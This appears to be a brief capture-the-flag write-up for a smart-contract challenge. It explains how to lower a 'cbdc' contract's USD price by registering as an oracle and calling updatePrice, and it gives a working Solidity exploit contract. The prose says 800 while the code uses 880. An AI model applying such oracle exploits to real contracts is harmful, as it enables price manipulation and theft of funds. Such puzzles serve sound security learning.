# Requirements

- We need to reduce the USD price.

# Attack explanation

We need to call updatePrice() function setting USD to 800. To do that, we need to do it with another contract so we can calculate block values successfully. But first, we need to add it as an oracle too.

´´´

    contract PriceUpdater {

        address cbdc = 0x094251c982cb00B1b1E1707D61553E304289D4D8;
        function updatePrice() public {
            cbdc.call(abi.encodeWithSignature("addOracle(string)", "bank"));
            uint256 blockNumber = block.number - 1;
            bytes32 blockHash = blockhash(blockNumber);
            cbdc.call(abi.encodeWithSignature("updatePrice(bytes32,uint256)", blockHash, 880));
        }
    }

´´´
